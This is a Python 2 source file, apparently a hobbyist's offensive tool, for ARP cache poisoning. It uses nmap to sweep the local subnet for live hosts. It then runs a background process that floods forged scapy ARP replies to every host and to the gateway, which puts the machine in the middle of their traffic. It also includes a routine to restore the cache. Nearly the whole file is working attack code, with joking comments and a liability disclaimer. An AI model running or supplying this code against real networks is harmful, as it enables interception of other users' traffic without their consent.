# written by Jan "Duchy" Neduchal
# 2018
# Licenced under the MIT licence
# Do whatever you want with the code, I don't really care. I <3 opensource.
# However note, that I, Jan Neduchal, take no responsibility for any malicious of your actions with this code
from multiprocessing import Process
import os
import sys
from scapy.all import sendp,Ether,ARP,get_if_hwaddr,getmacbyip,RadioTap,conf
import time
from random import randint
from datetime import datetime
import nmap
import gen_utils as gu
conf.verb = 0 #shut the fuck up scapy


class Arp:
    def __init__(self, iface = "eth0", wireless = False, DEBUG = False, log = False):
        self.iface = iface
        self.mac = get_if_hwaddr(self.iface)
        try:
            self.pub_ip = gu.get_pub_ip()
        except:
            print "Net connected to the internet.." # I still don't see it as much of a problem
        try:
            self.gateway = gu.get_default_gateway()
        except:
            raise Exception("noDefGateway")
        self.poison_pid = 0
        self.router_mac = getmacbyip(self.gateway)
        self.wireless = wireless  # currently this flag needs to be set manually (during obj init or obj.wireless = True)
        self.debug = DEBUG # un-shutthefuckups scapy and prints internal values
        self.log = log
        if self.debug:
            print self.iface
            print self.mac
            print self.gateway
            print self.router_mac
            print self.wireless
            conf.verb = 3
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")


    def __del__(self): # the class destructor
        if self.poison_pid !=0:
            os.kill(self.poison_pid, 9)
            self.restore_arp_table() # tries to save the day for the subnet
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Destroying the Arp_poison object at pub ip: " + self.pub_ip + str(datetime.now()) + "\n")


    def __get_targets(self, subnet):
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Started scanning " + str(datetime.now()) + "\n")
        finlst = []
        raw = nmap.PortScanner().scan(hosts=subnet, arguments='-sn') # casual use of nmap, searches for 'up' hosts
        for a, b in raw['scan'].items():
            if str(b['status']['state']) == 'up':
                try:
                    finlst.append([str(b['addresses']['ipv4']), str(b['addresses']['mac'])])
                except:
                    pass
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Finished scanning " + str(datetime.now()) + "\n")
        return finlst # returns a list


    def __send_poison(self):
        print "[*] Scanning for alive hosts.."
        target = self.__get_targets(str(self.gateway+"/24"))
        print "Done!"
        print "[*] Starting to poison.."
        print ""
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Poisoning the ARP cache " + str(datetime.now()) + "\n")
        while True:
            try:
                for i in range(len(target)): # if you have no idea whats going on below, read the scapy docs
                    if self.wireless == False:
                        poison_target = Ether()/ARP(op=2, psrc=self.gateway, pdst=target[i][0], hwdst=target[i][1])
                        poison_router = Ether()/ARP(op=2, psrc=target[i][0], pdst=self.gateway, hwdst=self.router_mac)
                        sendp(poison_target)
                        sendp(poison_router)
                    else:
                        poison_target = RadioTap()/ARP(op=2, psrc=self.gateway, pdst=target[i][0], hwdst=target[i][1])
                        poison_router = RadioTap()/ARP(op=2, psrc=target[i][0], pdst=self.gateway, hwdst=self.router_mac)
                        sendp(poison_target, iface=self.iface)
                        sendp(poison_router, iface=self.iface)
                time.sleep(1)
            except:
                if self.log:
                    with open("/var/log/fun&games.log", "a") as f:
                        f.write("ARP poisoning failed " + str(datetime.now()) + "\n")
                sys.exit("A major fuckup, can't spam my favorite ARP requests..")


    def poison_arp_table(self):
        proc = Process(target = self.__send_poison) # spawns a child slave process muhahaha >:]
        proc.start()
        self.poison_pid = proc.pid
        if self.debug:
            print "__send_poison PID: " + self.poison_pid


    def restore_arp_table(self):
        if self.poison_pid != 0:
            if self.log:
                with open("/var/log/fun&games.log", "a") as f:
                    f.write("Restoring ARP cache " + str(datetime.now()) + "\n")
            os.kill(self.poison_pid, 9)
            if self.wireless == False:
                pkt = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
            else:
                pkt = RadioTap()/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
            sendp(pkt, iface= self.iface, inter=0.2, count=40)
            self.poison_pid = 0
        else:
            print "Not running :/ ..."
        return 0

###################################################################################################
#                     init with arp = Arp_poison(iface = "the iface")                             #
###################################################################################################
